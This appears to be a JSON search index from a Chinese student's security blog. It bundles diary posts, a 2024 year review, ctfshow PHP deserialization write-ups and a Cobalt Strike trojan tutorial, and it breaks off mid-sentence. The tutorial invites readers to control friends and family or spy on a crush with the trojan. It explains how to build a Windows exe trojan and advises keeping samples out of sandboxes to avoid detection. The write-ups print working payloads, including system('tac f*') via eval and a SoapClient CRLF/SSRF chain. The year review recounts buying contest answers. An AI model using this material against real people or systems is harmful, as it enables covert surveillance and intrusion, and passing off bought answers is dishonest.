-应急响应"]},{"title":"3月3--3月8计划任务","url":"/2025/03/02/3月3-3月8计划任务/","content":"\nDemon说要监督我\n\n- [ ] 每天坚持背单词35+然后复习单词50+，尽量纸质电子同步积累，英语课也要充分利用起来\n\n- [ ] 一周坚持运动5天，不能比上周胖\n\n- [ ] 根据Demon的任务完成四级题目\n\n- [ ] 完成玄机靶场第一章，并且写blog记录玄机的wp\n\n- [ ] 给学弟们申请晚自习假条\n\n- [ ] 给华子姐起步取证和应急响应\n\n- [ ] 每天坚持七点起床然后睡觉最晚不超过12点半\n\n- [ ] 有概率论和数据库课的当天要及时复习掌握，然后看视频或者做题消化吸收，保证自己的进度在老师前面并且完成每天的作业\n\n- [ ] 每天抖音限时1h\n\n- [ ] burpsuite靶场这个月全部打![96e121fd4d70503140822347948880a](http://images.lwwww.top/images/20250302231035103.jpg)\n\n  \n","tags":["-日常 -计划"]},{"title":"獬豸杯取证再也不复现","url":"/2025/02/22/獬豸杯取证复现/","content":"\n没别的话，就是纯纯坐牢，太难受了。感觉很多题都是送分的，但是我对取证挂载都太不熟悉了，只会计算机取证但是还被密码卡死我真是要红温了，看着题目是真好又有引导性，对自己的提升肯定很大但是我真是受不了自己啥都不会了。FTK挂载 VC挂载然后是啥哇，安卓怎么仿真？\n\n崩溃，比赛之前我还觉得没啥问题做出来一半....\n\n\n\n复现也不复现了，纯屎\n\n没见过题目屎成这样环境屎成这样的。火眼全梭哈了，几个用sqllite找的密码啊？\n\n我就当吃了一下午屎。\n\n\n\n一周后：\n\n稍微冷静了点 其实就是自己水平不太够 要静心潜修了，工具固然好 但我仍然会继续去沉淀手搓 不能背弃自己的信仰 \n\n而且我现在也有火眼了哈哈哈\n\n![image-20250307074437036](http://images.lwwww.top/images/20250307074440703.png)\n\n","tags":["-wp -取证"]},{"title":"CS制作木马的简易小教程（纯娱乐不要拿来干坏事！）","url":"/2025/02/18/CS制作木马的简易小教程（纯娱乐不要拿来干坏事！）/","content":"\n想要制作小木马控制一下你的亲朋好友或者窥探一下女神的隐私吗\n\n那就让我来教教你\n\n首先就是得有个VPS云服务器，我就只学了cs制作exe文件的木马还有一种shellcode我还没研究所以就以window下的exe当例子咯\n\n先去极核那边把这个cs下上https://get-shell.com/1554.html\n\n强烈推荐极核网站真的很好🤩\n\n然后先说一下这个的原理，我找到的几个教程全是步骤没有原理导致我笨笨的在kali里面捯饬\n\ncs的使用是分为客户端和服务端的，服务端必须是linux环境，然后按照公网的来的话，就是需要你在Linux环境下开启server的服务，让cs客户端能够和服务端连接上去，只有这样cs才能启动，\n\n然后放几个我看的教程链接\t[工具分享 | CobaltStrike安装与简单使用](https://mp.weixin.qq.com/s/5uZiJECpPw8pfLc0JstZ0g)          \n\n我的服务器的环境是centos 这个是[centos的java环境配置](https://blog.csdn.net/Xx47585874/article/details/124849471?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522e28769ae6fb6d0ed23b60bd85ff4db25%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=e28769ae6fb6d0ed23b60bd85ff4db25&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124849471-null-null.142^v101^pc_search_result_base3&utm_term=centos%E5%AE%89%E8%A3%85java&spm=1018.2226.3001.4187)\n\n首先就是服务端需要Java环境,具体的其他操作可以去网上查，我只说我用的最方便无脑的方法\n\n利用[yum](https://so.csdn.net/so/search?q=yum&spm=1001.2101.3001.7020)源来安装jdk（此方法不需要配置环境变量）\n 查看yum库中的java安装包 ：`yum -y list java*`\n 安装需要的jdk版本的所有java程序：yum -y install java-1.8.0-openjdk* (安装完之后，默认的安装目录是在: /usr/lib/[jvm](https://so.csdn.net/so/search?q=jvm&spm=1001.2101.3001.7020)/java-1.8.0-openjdk-1.8.0.151-1.b12.el7_4.x86_64)\n\n然后输入java -version\n\n![image-20250218183004910](http://images.lwwww.top/images/20250218190410161.png)\n\n这样就是正常了\n\n然后这个时候你的安装包应该是下好了解压之后是这样的\n\n![image-20250218183113424](http://images.lwwww.top/images/20250218190415756.png)\n\n去把Server想办法放到服务端里面，用什么协议也好，传zip也行，我是直接finalshell拖进去的，完成后进入到Server的目录下对teamserver文件增加执行权限 \t`chmod +x teamserver` \t然后就得把这个服务端的服务起来了\n\n在下一步之前你要知道如果你是买的云服务器的话，你必须要干的一件事就是去安全组里面把入规则改一下，运行all 对你设定的端口进行tcp连接，如果不太懂得话那就按照我这个样子改一下就欧克\n\n![image-20250218184007106](http://images.lwwww.top/images/20250218190420845.png)\n\n记得也要在Linux本机上面开放端口\n\n开放端口\n\n**firewall-cmd --zone=public --add-port=5672/tcp --permanent**  # 开放5672端口\n\n**firewall-cmd --zone=public --remove-port=5672/tcp --permanent** #关闭5672端口\n\n**firewall-cmd --reload**  # 配置立即生效\n\n改成50050端口就行这是cs默认得，记得一定要进行配置立即生效的命令要不然要等很久\n\n1、启动服务端。\n\n./teamserver 127.0.0.1 passwd    \t\t#127.0.0.1服务端真实IP（最好写公网ip） 后面密码随意。\n\n![image-20250218183724547](http://images.lwwww.top/images/20250218190513450.png)\n\n大概是这样，如果报错了记得问ai解决，应该是问题不大了\n\n然后就是去客户端把cs连上了\n\n![image-20250218185207045](http://images.lwwww.top/images/20250218190426297.png)\n\n![image-20250218185257646](http://images.lwwww.top/images/20250218190429273.png)\n\nHOST就是你服务器的公网ip port都是自定义的不被占用就是，默认都是50050 password就是你命令里面设置那个\n\n以上属于是调试cs了，然后下面才是目的---生成木马\n\n![image-20250218185511497](http://images.lwwww.top/images/20250218190439982.png)\n\n![image-20250218185553846](http://images.lwwww.top/images/20250218190443691.png)\n\n\n\n![image-20250218185827719](http://images.lwwww.top/images/20250218190449174.png)\n\n\n\n然后有监听了就去生成exe\n\n![image-20250218185948239](http://images.lwwww.top/images/20250218190501079.png)\n\n![image-20250218190047341](http://images.lwwww.top/images/20250218190455140.png)\n\n然后你就可以有一个小木马咯\n\n记得不要扔到微步或者别的云沙箱 赵师傅告诉我说如果扔进去了你的这个exe的服务器ip会被记住然后就很难过免杀了\n\n以后有空我再去研究一下如果过免杀哈哈\n\n\n\n","tags":["-WEB -渗透 -木马"]},{"title":"Yakit学习","url":"/2025/02/15/Yakit学习/","content":"\n先汇报一下近况，没咋学习，本身打算好好学习一下反序列化和ssti的但是一直犯懒不想学，这几天有个项目我看着挺好的，给本地的国企培训渗透测试一天1.5k，一整套下来1.5w真是馋死我了，但是水平真是有限，我都谎称自己大三了还是没看上我，甚至连面试的环节都没有。我还在内心纠结了很久很久我到底能不能干这个活\n\n\n\n![image-20250215140034297](http://images.lwwww.top/20250217213255306.png)\n\n本来的算盘是进阶web实力的但是现在看来我好像也对ctf没有那么那么渴望。感觉自己挺不负责的还没啥毅力和耐心，先不管了，反正是打算学着用用yakit然后熟悉熟悉渗透测试的。刚才搞这个破图床搞了好久感觉也没搞明白乱七八糟的先不管了回头在调整吧。真是烦死了，感觉自己真是笨死了，那些大牛子们为什么会那么多东西哇？😑😑😑\n\n\n\nyakit是yak延申出来的一个gui yaklang可以理解为一个专门为网络安全而生的语言，用来开发各种平台产品之类的，从golang延伸出来的：它旨在简化渗透测试、漏洞利用、安全工具开发等任务，提供高度集成化的安全功能模块和便捷的语法，帮助安全研究人员快速实现复杂的攻防场景。\n\n![image-20250215233214351](http://images.lwwww.top/images/20250217214245255.png)\n\n*MITM（man-in-the-middle）操作台==burpsuite*\n\n这里放上链接[Yakit](https://www.yaklang.com/products/intro)下载和安装等教程都非常详细这里不进行过多赘述![image-20250216002124571](http://images.lwwww.top/images/20250217214331739.png)\n\n\n\n然后就是yakit有个本地模式和远程模式，对于我来说目前用不上远程模式哈哈\n\n如果会玩bp可以直接省略yakit的学习了，因为我听了点视频发现没啥内容能记录下来。\n\n【【干货】Yakit使用教程01-入门简介与安装教程】https://www.bilibili.com/video/BV1Cg4y1u7VD?vd_source=549b9e183402012ff590dc727d995039放上官方的教程自己看吧\n\n补充一点，我在进行yakit本地靶场测试的时候，有的题目是可以直接hackerbar解决但是为了熟悉yakit 所以我决定用yakit麻烦点去做，但是一直抓不到本地靶场的包，所以经过快一周的测试和研究当然也是主要没怎么研究光研究图床为什么不通了。\n\n最后找到一个问题的关键点就是，代理自动设置成了本地主机不经过代理，所以也就抓不到包。用这个思路基本上就能解决了,\n","tags":["-渗透 -web -yakit -学习"]},{"title":"20250207","url":"/2025/02/07/20250207/","content":"\n\n\n今天12点多因为太饿了所以决定早睡，但是没有早起，赖床赖到八点五十，起床把昨天买的手擀面煮上了，放了一点鸡精 耗油 生抽 和好几个鸡蛋。美美的吃完了早饭，香拽了！然后就是困~ 晕碳吗？\n\n吃完发现体重多了快两公斤，但是我感觉我进肚里的东西还没一斤呢。反复称了好几次，称到了一个满意的体重,我才放过不听话的体重秤。本来打算吃完就去运动消化一下，别吃胖了前功尽弃，但是去锻炼的路上突然遭遇罪大恶极怨念缠身的恶床，为了拯救世界不让它破坏世界和平，我毅然决然变成小猪🐖睡服它。\n\n一直睡到11点半它才肯罢休，真是 太可恶了。二次起床之后我去给pwnpwn（胖胖）喂奶，它跟恶鬼一样裹着奶嘴就吨吨吸，鼻子全是奶泡也停不下来。\n\n今天真爽，嘻嘻。吃饭真好👍\n","tags":["-随笔"]},{"title":"浅学PHP反序列化","url":"/2025/01/31/浅学PHP反序列化/","content":"\n\n\n# 浅学PHP序列化：serialize()\n\n序列化:把对象转换为可传输的字节序列的过程--是为了解决在不同的机器之间传输复杂数据类型的一种机制\n\n序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。\n\n本次学习主要参考[baozongwi](https://baozongwi.xyz/)师傅的php[反序列化文章](https://baozongwi.xyz/2024/09/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-pop/)和[Y4tacker](https://y4tacker.github.io/)的[[CTF]PHP反序列化总结](https://y4tacker.blog.csdn.net/article/details/113588692?fromshare=blogdetail&sharetype=blogdetail&sharerId=113588692&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)辅助学习😘\n\nCTFSHOW靶场主要参考ZredamanJ师傅的[ctfshow 反序列化](https://blog.csdn.net/qq_61237064/article/details/123331126?fromshare=blogdetail&sharetype=blogdetail&sharerId=123331126&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)\n\n推荐课程陈腾老师的[反序列化课程](https://www.bilibili.com/video/BV1R24y1r71C?vd_source=549b9e183402012ff590dc727d995039)陈腾老师的ssti的课也很好👍\n\n反序列化:把字节序列化转换为对象的过程\n\n序列化与反序列化的最终目的:实现对象的跨平台存储,网络传输\n\n为什么要有序列化呢？\n\n就是因为序列化方便呗,占用小空间传递更多的信息\n\n```php\ndemo:\n<?php\nclass me{\n    public $name=lww;\n    public $age=20;\n    public  $ctf=web;\n}\necho serialize(new me());\n\n回显：O:2:\"me\":3:{s:4:\"name\";s:3:\"lww\";s:3:\"age\";i:20;s:3:\"ctf\";s:3:\"web\";}\n```\n\n在这里的格式为：变量类型:类名长度:类名:属性数量:{属性类型:属性名长度:属性名;属性值类型:属性值长度:属性值内容\n\n在这里还涉及到一个基础的知识点就是php是面向对象的如果不了解可以去[菜鸟教程](https://www.runoob.com/php/php-oop.html)熟悉一下\n\n### 魔术方法\n\nPHP 中的魔术方法是指那些以双下划线（__）开头的特殊方法。它们在特定的情况下自动调用，用于执行特定的功能，比如在对象序列化时、访问未定义的属性或方法时等。这些方法为PHP编程提供了强大的工具，使得可以更简洁地执行复杂的任务。\n\n    __construct() //当创建新对象时自动调用。\n    __destruct() //对象不再被使用且需要被销毁时调用。\n    __call($name, $arguments) //当调用一个不可访问的方法时调用。\n    __callStatic($name, $arguments) //当调用一个不可访问的静态方法时调用。\n    __get($name) //用于读取不可访问的属性。\n    __set($name, $value) //用于写入不可访问的属性。\n    __isset($name) //当对不可访问的属性调用 isset() 或 empty() 时被调用。\n    __unset($name) //当对不可访问的属性调用 unset() 时被调用。\n    __toString() //当尝试将对象当作字符串输出时调用。\n    __invoke() //当尝试将对象当作函数调用时执行。\n    __clone() //当对象被复制时调用。\n    __sleep() //在序列化前调用，用于清理对象，并返回表示哪些属性需要被序列化的数组。\n    __wakeup() //在反序列化后调用，用于重新初始化对象的属性或执行其他重建任务。\n\n存在自动调用,可以相互调用\n\n\n\n\n\n# ctfshow 反序列化\n\n\n\n#### web254\n\n源码:\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this->isVip;\n    }\n    public function login($u,$p){\n        if($this->username===$u&&$this->password===$p){\n            $this->isVip=true;\n        }\n        return $this->isVip;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this->isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = new ctfShowUser();\n    if($user->login($username,$password)){\n        if($user->checkVip()){\n            $user->vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n} \n```\n\n\n\n**payload**\n\n`https://03de7056-2630-45a9-b5a3-f21a6e0a8e3c.challenge.ctf.show/?username=xxxxxx&password=xxxxxx`\n\n#### web255\n\n```php\n<?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this->isVip;\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this->isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);    \n    if($user->login($username,$password)){\n        if($user->checkVip()){\n            $user->vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n} \n\n/*发现要从cookie中获取值并且需要把flase改为ture*/\n```\n\n\n\n\n\n```php\npayload\n<?php\nclass ctfShowUser{\n    public $isVip='true';\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n}\n$a=new ctfShowUser();\necho urlencode( serialize($a));\n\nO%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bs%3A4%3A%22true%22%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3B%7D\nurl?username=xxxxxx&passname=xxxxxx\n\n```\n\n\n\n#### web256\n\n```php\n<?php\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this->isVip;\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this->isVip){\n            global $flag;\n            if($this->username!==$this->password){\n                echo \"your flag is \".$flag;\n            }\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);\n    if($user->login($username,$password)){\n        if($user->checkVip()){\n            $user->vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n\n这个题其实就是使得username与password不相同，用上题的脚本稍作修改就行\n```\n\n#### web257\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfShowUser{\n    private $username='xxxxxx';\n    private $password='xxxxxx';\n    private $isVip=false;\n    private $class = 'info';\n\n    public function __construct(){\n        $this->class=new info();\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function __destruct(){\n        $this->class->getInfo();\n    }\n\n}\n\nclass info{\n    private $user='xxxxxx';\n    public function getInfo(){\n        return $this->user;\n    }\n}\n\nclass backDoor{\n    private $code;\n    public function getInfo(){\n        eval($this->code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);\n    $user->login($username,$password);\n}\n```\n\n\n\n```php\npayload：\n<?php \nclass ctfShowUser{\n   private $class;\n   public function __construct(){\n    $this->class=new backDoor();//这就是在创建时被调用\n }\n}\nclass backDoor{\n    private $code=\"system('tac f*');\";          //在实际中多试试tac /f*或者tac f*\n}\n$a=new ctfShowUser();\necho urlencode(serialize($a));\n不能直接private $class=new backDoor();来赋给class一个类的值，只能通过__construct来赋值，但是可以直接赋给其字符的值。\n要注意的是用user传命令时需要带个分号\n\t看好要求是去cookie里面传参\n```\n\n**construct--demo**\n\n```php\n<?php\n/* construct 构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作*/\nclass Demo{\n    public $name=\"lww\";\n    public $age=20;\n    public function __construct(){\n        $this->name=\"Demon\";\n        $this->age=21;\n        echo \"construct被调用\\n\";\n    }\n}\n$a=new Demo();\necho serialize($a);\n/*\nconstruct被调用*/\n\n\nO:4:\"Demo\":2:{s:4:\"name\";s:5:\"Demon\";s:3:\"age\";i:21;}\n\n```\n\n#### web258\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n    public $class = 'info';\n\n    public function __construct(){\n        $this->class=new info();\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function __destruct(){\n        $this->class->getInfo();\n    }\n\n}\n\nclass info{\n    public $user='xxxxxx';\n    public function getInfo(){\n        return $this->user;\n    }\n}\n\nclass backDoor{\n    public $code;\n    public function getInfo(){\n        eval($this->code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){\n        $user = unserialize($_COOKIE['user']);\n    }\n    $user->login($username,$password);\n}\n```\n\n```php\n分析：\n本题的难点在于过滤\nif(isset($username) && isset($password)){\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){\n        $user = unserialize($_COOKIE['user']);\n    }\n    $user->login($username,$password);\n}\n正则过滤[oc]是匹配o字符或者c字符，\\d匹配一个数字字符，等价于[0-9]，+号是匹配前面的\\d一次或者多次。下面只需要将O:11变成O:+11就可以绕过了\n检查 $_COOKIE['user'] 这个 Cookie 的值是否不包含符合正则表达式 /[oc]:\\d+:/i 的模式。如果不包含，则条件为真，执行 if 语句块内的代码；如果包含，则条件为假，跳过 if 语句块内的代码。在实际应用中，这种检查通常用于防范 PHP 反序列化漏洞，因为某些恶意的序列化字符串可能包含 O: 或 C: 开头的模式。\n为了躲避检查+11可以躲开\\d的纯数字字符\n```\n\n```php\npayload:\nuser=O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%27tac+f%2A%27%29%3B%22%3B%7D%7D\n<?php\nclass ctfShowUser{\n    public $class;\n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\nclass backDoor{\n    public $code=\"system('tac f*');\";\n}\n$a=new ctfShowUser();\n$b=serialize($a);\n$b=str_replace(\"O:\",\"O:+\",$b);\necho urlencode($b);\n```\n\n#### WEB259\n\n这题考查PHP原生类的反序列化\n\n先放题\n\n```\nflag.php \n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\n\nif($ip!=='127.0.0.1'){\n\tdie('error');\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);\n\t}\n}\n\n然后实例里面的php页面是\n<?php\n\nhighlight_file(__FILE__);\n\n\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n\n```\n\n\n\n大致流程为：\n\n1、通过访问一个不存在的方法，调用原生类SoapClient的_call方法\n\n2、通过SoapClient原生类里面带有的user_agent构造处POST方法 \n\n3、User-Agent和Content-Type间通过\\r\\n分割，因为在HTTP协议中，HTTP header与HTTP Body是用两个CRLF分隔的 \n\n4、利用其中的location为http://127.0.0.1/flag.php，构造SSRF，可以让访问flag.php的IP为127.0.0.1\n\n> [!TIP]\n>\n> ## 关于php原生类\n>\n> ```\n> PHP 原生类（Native Classes）是指 PHP 语言内置的类，由 PHP 核心或官方扩展直接提供，无需用户自行定义即可直接使用。这些类通常提供了常用的功能（如日期处理、文件操作、异常处理等），是 PHP 开发中的基础工具。\n> 主要特点\n> 无需定义：原生类已随 PHP 安装包或扩展默认提供。\n> 高效稳定：经过 PHP 官方优化和测试，性能可靠。\n> 功能明确：每个类专注于解决特定领域的问题。\n> ```\n>\n> Y4tacker的[反序列化总结](https://y4tacker.blog.csdn.net/article/details/113588692?spm=1001.2014.3001.5502)里面的php原生类反序列化板块有详解，内容可能较多\n\n```php\npayload:\n<?php\n \n$ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n \n$client=new SoapClient(null,array('uri'=>\"127.0.0.1/\",'location'=>\"http://127.0.0.1/flag.php\",'user_agent'=>$ua));\n \necho urlencode(serialize($client))\n \n?>\n\n/*\n?vip=O%3A10%3A\"SoapClient\"%3A5%3A%7Bs%3A3%3A\"uri\"%3Bs%3A10%3A\"127.0.0.1%2F\"%3Bs%3A8%3A\"location\"%3Bs%3A25%3A\"http%3A%2F%2F127.0.0.1%2Fflag.php\"%3Bs%3A15%3A\"_stream_context\"%3Bi%3A0%3Bs%3A11%3A\"_user_agent\"%3Bs%3A138%3A\"ctfshow%0D%0Ax-forwarded-for%3A127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A13%0D%0A%0D%0Atoken%3Dctfshow\"%3Bs%3A13%3A\"_soap_version\"%3Bi%3A1%3B%7D\n然后访问flag.txt\n\n\n```\n\n#### WEB260\n\n```php\n<?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nif(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){\n    echo $flag;\n}\n```\n\n直接传入?ctfshow= ctfshow_i_love_36D就行\n\n#### WEB261\n\n```php\n<?php\n\nhighlight_file(__FILE__);\n\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n\n    public function __construct($u,$p){\n        $this->username=$u;\n        $this->password=$p;\n    }\n    public function __wakeup(){\n        if($this->username!='' || $this->password!=''){\n            die('error');\n        }\n    }\n    public function __invoke(){\n        eval($this->code);\n    }\n\n    public function __sleep(){\n        $this->username='';\n        $this->password='';\n    }\n    public function __unserialize($data){\n        $this->username=$data['username'];\n        $this->password=$data['password'];\n        $this->code = $this->username.$this->password;\n    }\n    public function __destruct(){\n        if($this->code==0x36d){\n            file_put_contents($this->username, $this->password);\n        }\n    }\n}\n\nunserialize($_GET['vip']); \n\n\n考点：\n    如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。\n```\n\n\n\n#### WEB262\n\n字符串逃逸\n\n```php\n<?php\n\n\n\nerror_reporting(0);\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) && isset($m) && isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    setcookie('msg',base64_encode($umsg));\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n\n```\n\n这段 PHP 代码的主要功能是接收来自用户通过 GET 请求传递的三个参数 `f`、`m` 和 `t`，并使用这些参数创建一个 `message` 类的对象。在创建对象后，将对象序列化，把序列化字符串中的 `fuck` 替换为 `loveU`，再对处理后的字符串进行 Base64 编码，最后将编码后的结果作为一个名为 `msg` 的 Cookie 发送给用户。同时，代码还会输出一条消息提示用户消息已发送，并将当前 PHP 文件的源代码高亮显示出来。\n\n","tags":["-php -反序列化 -web"]},{"title":"2024年终总结","url":"/2025/01/29/2024年终总结/","content":"\n\n\n其实看到大师傅们在元旦的时候写年终总结我就很是羡慕，但是当时自己没有blog并且也写了也不知道给谁看所以就一直拖着没写，但是我感觉这一年我有好多事情想写下来记录下来\n\n## 二月\n\n这个时候我还在梦想着如果大学期间能够拿一个国奖该是多么牛逼的存在，我的目标紧紧盯住24的华为ICT大赛，幻想着暑假猛猛学一波之后杀进国赛，同时我也深深对以后感到顾虑，我去青岛的线下课程班学习，但是效果还是很一般，只是把HCIP学到七八成的样子。\n\n## 三月\n\n开学的时候跟傻子一样帮班里的同学搬书，给我累死了我决定以后再也不会帮忙搬书了，然后最让我感到压力的是这个月我开始整大学生创新创业计划了，刘文荣老师给我洗脑快洗疯了，然后我也是因为不敢拒绝硬生生接下了这个任务弄了差不多一个周找了一些资料和理论然后加上对网工的熟悉和对学校老师水平的自信我开题了一个叫**基于OTN和VPN技术的数据传输优化方案**的项目但是我现在回头看感觉挺二逼的，但是我对这个项目的质量还是比较有信心的，谢飞帆老师给的评价是我做不出来，这个项目的水准至少是个优秀的硕士毕业论文，当时给我装爽了，同时也是这学期wsq学长开始接手实验室，我开始接触ctf。\n\n![大创文件截图.png](https://Liang-WW.github.io/images/202501/年终总结/大创文件截图.png)\n\n与此同时我也考了计算机等考的c语言二级，但是后来没过，哈哈其实我根本就是水逼平时有点东西全用来装逼了。\n\n## 四月\n\n四月份最令我印象深刻的就是XYCTF了，到现在我也认为XYCTF的题真的很合适，我也是从这个时候开始正式接触CTF，这个比赛维持了一个月，我知道了CTF原来是这么一回事，但是我努力了很久很久也不能自己做出来题目，我和我当时的搭档的分工大概是他主web我主misc，当时学习还属于是在b站上看ctf教程呢，但是到现在我也没看几个哈哈，一个zip伪加密搞了好几天才明白，还有爆破密码什么的我天天就是跟在学长屁股上要答案，他做出来我就问他要，但是当时的学长也是实力很有限，也是在这个时候我去找徐静老师要晚自习的假条以后晚自习就转战实验室了\n\n## 五月\n\nxyctf在半路就被夭折了，我的队友不知道从哪找的wp交了好几个flag被封号了，当时做题晕晕的，接着就是iscc的到来，五一假期就开始做iscc这是大学生榜单上的赛事，与此同时还有我的校赛也正在进行，wsq学长负责出题也给我们透了很多题目，但是他给他同班的人透题透更多，然后我就和我之前的web手暗中交流最后两个二等奖，第一名竟然是我同班的hy师傅，当时觉得他很牛很牛，然后这一期间web手黄同学和wsq闹掰了我就从中帮他们交流，然后就开始做iscc的题目，刚开始没想那么多，但是后来就学会了闲鱼学会了py，这也是我学的最快的时候，我所有的精力都放在怎么复现题目了，很多东西根本不明白，但是就是跟着wsq学长模仿，遇到问题就框框问，框框查。最后几天iscc的wp都变成公共的了，五块钱全都有然后最后几天的时候大家都在冲刺，服务器就没有正常的时候\n\n![iscc咸鱼.jpg](https://Liang-WW.github.io/images/202501/年终总结/iscc咸鱼.jpg)\n\n## 六月\n\n六月是我的噩梦，我打了CISCN，真是太痛苦了，学长py进南京线下了，我因为自己复现不出来那么多题错失去线下南京，坐牢两天，队友因为坐牢太难受了就不来了我很生气从此也对国赛有恐惧感。iscc给我定榜2016名差一点点国三，当时人生都很黑暗，心情很压抑。那么多美好的东西都理我擦肩而过。\n\n也就是说我一年下来什么都没得到，我的野心都变成了笑话，而隔壁实验室的同学都已经开始拿奖了，我甚至为了让我下学期有评奖评优的资格去调换了宿舍\n\n## 七月\n\n期末考试出成绩了考的很一般，我本来想争取国家奖学金的雄心壮志都稀碎了。然后一边挂着网课听华为一边又开始玩电脑，慢慢接触了src，一狠心直接付费学习钟北山，然后慢慢放弃网工的学习，这也意味着我之前的学习都打了水漂\n\n## 八月\n\n正式进攻web，开始抓包，开始尝试山东省教育系统攻防演练，开始和赵师傅接触变多，从这段时间开始我就经常骚扰赵师傅，因为别人不好意思问，而且赵师傅会挖洞，当时我就想如果我大三能有赵师傅的水平就好了，北山师傅给的入学考试我一道题也不会，然后给了我一套课让我学习，这段时间是我学习的时间也是我荒废的时间，我天天在家里告诉所有人我在学习但是实际上每天的有效学习还不到两个小时，一直到开学我才是会一点sql的原理，xss的原理，upload文件上传的东西，也是在这个时候，我逐渐感到网安的魅力，也学会了如何学习。\n\n## 九月\n\n开学了，我的web手不干了，本来就是比较古怪的人，后来刘文荣老师知道了以后去尝试调解也没成功，好像是因为我没有帮他报名比赛得罪他了，很抽象。至此23级只剩我一人并且刚刚入门，开学准备了一段时间的计算机三级但是也是很意外的没过，于是我决定我再也不会考计算机等考了，这个月把山东省赛打进去了，当时老师把校队名额给了凯哥我很不服当时还和凯哥不认识,然后我突然意识到好像到我负责今年的新生了然后我就开始筹备，一个人搞所有的东西真的很累很崩溃\n\n我还当学生代表和深信服的人去了解学校的合作，但是我感觉好坑人，不如自己学了，学校把钱花在这种地方很不值当\n\n## 